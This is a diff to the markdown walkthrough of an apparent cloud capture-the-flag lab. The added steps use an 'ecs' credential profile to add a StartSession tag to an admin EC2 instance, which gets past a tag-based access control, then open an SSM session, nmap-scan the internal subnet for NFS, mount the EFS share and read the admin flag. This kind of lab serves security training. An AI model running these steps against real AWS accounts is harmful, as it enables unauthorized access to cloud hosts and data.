@@ -187,8 +187,31 @@ So we need to change the tags on admin ec2 to do that using the instance id role
 aws configure --profile ecs
 <Eneter Access Key, Secret Access Key, Region (same as ruse) and output as text>
 ```
-2. Assume the role ``` aws sts get-caller-identity```
-3. 
+2. Update the tags ```aws ec2 create-tags --resource <admin instance id> --tags “Key=StartSession,Value=true”````
+3. SSM Start session ```aws ssm start-session --target <admin instance id> --profile ecs```
+
+### Mount EFS
+1. EFS runs on port 2049, so we can scan the network via the following: 
+```
+sudo snap install nmap -> install nmap
+nmap -Pn -p 2049 --open 10.10.10.0/24
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-16 23:08 UTC
+Nmap scan report for ip-10-10-10-225.ec2.internal (10.10.10.225) -> EFS Ip Address
+Host is up (0.0014s latency).
+
+PORT     STATE SERVICE
+2049/tcp open  nfs
+
+Nmap done: 256 IP addresses (256 hosts up) scanned in 16.70 seconds
+```
+2. Mount the efs
+```
+cd /mnt
+mkdir /efs
+sudo apt-get -y install nfs-common -> install nfs-common
+sudo mount -t nfs4 -O no_netdev -o nfsvers=4.1,rsize=1048576,wsize=1048576,hard,timeo=600,retrans=2,noresvport <EFS IP>:/ /efs 
+cat admin/flag.txt -> to get the final flag.
+```
 # Trouble Shooting
 ## Installation
 
